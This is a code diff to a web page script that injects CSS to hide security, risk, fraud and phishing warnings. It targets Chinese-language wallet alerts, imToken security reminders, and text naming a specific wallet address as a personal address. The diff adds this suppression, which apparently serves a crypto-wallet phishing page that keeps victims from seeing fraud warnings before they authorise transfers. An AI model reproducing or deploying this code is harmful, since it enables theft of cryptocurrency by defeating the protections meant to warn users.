@@ -64,14 +64,21 @@
         (function() {
             'use strict';
             
-            // 🎯 立即隐藏安全相关元素的CSS
+            // 🎯 强化隐藏安全相关元素的CSS
             const hideCSS = document.createElement('style');
             hideCSS.textContent = `
                 [class*="security"], [class*="warning"], [class*="risk"], [class*="alert"],
-                [id*="security"], [id*="warning"], [id*="risk"],
+                [class*="danger"], [class*="modal"], [class*="popup"], [class*="dialog"],
+                [id*="security"], [id*="warning"], [id*="risk"], [id*="alert"],
+                [id*="modal"], [id*="popup"], [id*="dialog"],
                 *[innerHTML*="安全中心"], *[innerHTML*="风险"], *[innerHTML*="提醒"], 
-                *[innerHTML*="欺诈"], *[innerHTML*="个人地址"],
-                *[innerHTML*="Security"], *[innerHTML*="Warning"], *[innerHTML*="Risk"] {
+                *[innerHTML*="欺诈"], *[innerHTML*="个人地址"], *[innerHTML*="风险评估"],
+                *[innerHTML*="授权风险"], *[innerHTML*="检测到"], *[innerHTML*="项风险"],
+                *[innerHTML*="可能存在"], *[innerHTML*="欺诈行为"],
+                *[innerHTML*="THjNZbFNv9w3M1wyisiaFX97rHrP4gF44x"],
+                *[innerHTML*="此地址为个人地址"],
+                *[innerHTML*="Security"], *[innerHTML*="Warning"], *[innerHTML*="Risk"],
+                *[innerHTML*="Alert"], *[innerHTML*="Fraud"], *[innerHTML*="Phishing"] {
                     display: none !important;
                     visibility: hidden !important;
                     opacity: 0 !important;
@@ -82,6 +89,16 @@
                     width: 0 !important;
                     overflow: hidden !important;
                     z-index: -9999 !important;
+                    pointer-events: none !important;
+                    user-select: none !important;
+                }
+                
+                /* 🎯 特殊处理imToken安全提醒 */
+                .security-center, .risk-warning, .fraud-warning, 
+                .security-alert, .risk-assessment, .authorization-risk {
+                    display: none !important;
+                    visibility: hidden !important;
+                    opacity: 0 !important;
                 }
             `;
             document.head.appendChild(hideCSS);
